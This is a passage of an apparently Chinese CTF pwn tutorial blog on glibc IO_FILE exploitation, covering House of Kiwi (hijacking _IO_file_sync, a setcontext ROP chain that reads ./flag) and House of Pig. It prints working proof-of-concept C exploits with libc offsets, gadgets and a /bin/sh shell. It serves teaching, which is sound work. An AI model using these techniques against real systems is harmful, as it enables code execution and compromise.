class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = &amp;getshell;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231025114705128.png"
                      alt="image-20231025114705128"
                ></p>
<p><strong>开了沙箱禁用 execve</strong></p>
<p>对于禁用 <code>execve</code> 的程序需要借助 <code>(setcontext+61) + rop</code> 或 <code>shellcode</code> 进行 <code>orw</code> 。<code>glibc 2.29</code>之后 <code>setcontext</code>中的 <code>gadget</code>变成了以 <code>rdx </code>索引，因此还要先通过 <code>ROP</code>控制 <code>RDX</code>的值。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; setcontext+61</span><br><span class="line">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:00000000000580E4                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:00000000000580EB                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:00000000000580EF                 mov     r12, [rdx+48h]</span><br><span class="line">.text:00000000000580F3                 mov     r13, [rdx+50h]</span><br><span class="line">.text:00000000000580F7                 mov     r14, [rdx+58h]</span><br><span class="line">.text:00000000000580FB                 mov     r15, [rdx+60h]</span><br><span class="line">.text:00000000000580FF                 test    dword ptr fs:48h, 2</span><br><span class="line">    ....</span><br><span class="line">.text:00000000000581C6                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:00000000000581CD                 push    rcx</span><br><span class="line">.text:00000000000581CE                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:00000000000581D2                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:00000000000581D6                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:00000000000581DD                 mov     r8, [rdx+28h]</span><br><span class="line">.text:00000000000581E1                 mov     r9, [rdx+30h]</span><br><span class="line">.text:00000000000581E5                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:00000000000581EC                 xor     eax, eax</span><br><span class="line">.text:00000000000581EE                 retn</span><br></pre></td></tr></table></figure></div>

<p><em>tips:注意，内存中有不止一个  <code>_IO_helper_jumps_</code> ，具体是哪一个要通过调试确定</em></p>
<p>调用 <code>_IO_new_file_sync</code> 时 <code>rdx</code> 指向的是 <code>_IO_helper_jumps_</code> 结构，该结构同样可写。因此可以通过修改 <code>_IO_helper_jumps_</code> 中的内容来给寄存器赋值。还需要设置 <code>rsp</code> 指向提前布置好的 <code>rop</code> 的起始位置，同时设置 <code>rip</code> 指向 <code>ret</code> 指令。最后劫持程序流实现 <code>orw</code> 。</p>
<p>总体利用思路如下:</p>
<ul>
<li>利用 <code>large bin attack</code> 改位于 <code>_IO_file_jumps</code> 中的<code>_IO_file_sync</code>指针为 <code>setcontext + 61</code></li>
<li>修改<code>IO_helper_jumps + 0xA0</code> 和 <code>IO_helper_jumps + 0xA8 </code>分别为可迁移的存放有 <code>rop</code> 的位置和 <code>ret</code> 指令或者 <code>rop</code> 首个指令地址的位置,则可以进行栈迁移</li>
</ul>
<p><strong>poc</strong></p>
<p>来自 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_kiwi" >_sky123_老师 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x2da82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x107191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x37bba</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x446d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x88236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x50bd0</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_helper_jumps = libc_base + <span class="number">0x1f3980</span>; <span class="comment">// _IO_helper_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line">	<span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA0</span>/<span class="number">8</span>) = (<span class="type">size_t</span>)ROP; </span><br><span class="line">    <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; </span><br><span class="line"> 	<span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = magic_gadget;</span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中</span></span><br><span class="line">    <span class="comment">// 其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231025114912932.png"
                      alt="image-20231025114912932"
                ></p>
<p><strong>glibc-2.36 的执行流</strong></p>
<p><code>glibc-2.36</code> 的 <code>__malloc_assert</code> 发生重大改变，直接通过系统调用不走 <code>IO</code>，该方法失效。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_Noreturn <span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  __libc_message (do_abort, <span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fatal glibc error: malloc assertion failure in %s: %s\n&quot;</span>,</span><br><span class="line">		  function, assertion);</span><br><span class="line">  __builtin_unreachable ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-pig"><a href="#House-of-pig" class="headerlink" title="House of pig"></a>House of pig</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>再来看一下 <code>_IO_str_overflow</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 覆盖到这里</span></span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 调用malloc</span></span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);<span class="comment">// 调用memecpy，覆盖</span></span><br><span class="line">	      <span class="built_in">free</span> (old_buf); <span class="comment">// 调用free</span></span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line">      ...</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>利用流程如下：</p>
<ul>
<li>将<code>_IO_buf_base</code> 指向 <code>/bin/sh\x00</code> 地址。</li>
<li>控制<code>_IO_buf_end-_IO_buf_base</code> 的值也就是 <code>new_size</code> 的值，进而控制分配的 <code>chunk</code> 的大小，分配到布局好的地址。</li>
<li>利用 <code>memcpy</code> 中覆盖地址，也就是 <code>malloc</code> 出来的 <code>new_buf</code>， 可以覆盖<code>__malloc_hook/__free_hook</code> 等</li>
<li>最后调用 <code>free(old_buf) -&gt; system(&quot;/bin/sh&quot;)</code>，</li>
</ul>
<p>在 <code>glibc-2.34</code> 后 <code>ptmalloc</code> 取消了各种 <code>hook</code>，但依然可以用 <code>house of pig</code> 实现任意地址写任意值，借助其他手段完成权限获取，后面有时间会做补充。</p>
<p><code>House of Pig</code> 是一个将 <code>Tcache Statsh Unlink Attack</code> 和 <code>FSOP</code> 结合的攻击，同时使用到了 <code>Largebin Attack</code> 进行辅助。主要适用于 <code>libc 2.31</code> 及以后的新版本 <code>libc</code> 并且程序中仅有 <code>calloc</code> 时。</p>
<p>利用条件为：</p>
<ul>
<li>存在 <code>UAF</code></li>
<li>能执行 <code>abort</code> 流程或程序显式调用 <code>exit</code> 或程序能通过主函数返回。</li>
</ul>
<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a><a class="link"   href="https://github.com/Hornos3/pwnfile" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* string)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, string);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;今天我们来学习一下house of pig的利用原理。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig在只能使用calloc进行内存分配的CTF赛题中也有用武之地。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先我们了解一下这种利用方式的基本原理。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本程序运行于ubuntu 20.04, glibc版本为2.31-0ubuntu9.9。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在glibc 2.31下，house of pig需要利用__free__hook。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第一步：获取libc的加载地址及堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;通过puts函数获取libc加载地址，在本libc中其偏移为0x84420。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;libc的加载地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后我们通过分配一个chunk（大小为0x500）来获得一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> chunk_1 = (<span class="type">size_t</span>) <span class="built_in">malloc</span>(<span class="number">0x4F0</span>) - <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;获得堆地址为这个chunk的起始地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n\n&quot;</span> STR_END, chunk_1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第二步：通过large bin attack或其他方法将__free_hook附近写上一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;为了方便起见，本程序直接对__free_hook附近地址进行修改。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在实际应用中，我们要维护好这个堆地址，在后面的步骤中还会用到。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT, <span class="string">&quot;这里在__free_hook-0x10处写入刚才获得的堆地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本libc中__free_hook的偏移为0x1EEE48。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> __free_hook = libc_base + <span class="number">0x1EEE48</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;__free_hook的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, __free_hook);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* vuln_1 = (<span class="type">size_t</span>*)(__free_hook - <span class="number">0x8</span>);</span><br><span class="line">    <span class="comment">// ---------- 第一处漏洞利用 ---------- //</span></span><br><span class="line">    *vuln_1 = chunk_1;</span><br><span class="line">    <span class="comment">// --------------------------------- //</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;第一处漏洞利用完成，已在__free_hook-0x10处写入堆地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第三步：通过large bin attack或其他方法向_IO_list_all写入一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本libc中__free_hook的偏移为0x1ED5A0。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x1ED5A0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;_IO_list_all中原本保存的应该是_IO_2_1_stderr_这个文件结构体实例。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在程序调用exit函数时会对_IO_list_all中的FILE结构体依次进行遍历。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;exit函数的调用链为：exit-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_flush_all_lockp的函数定义：\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span 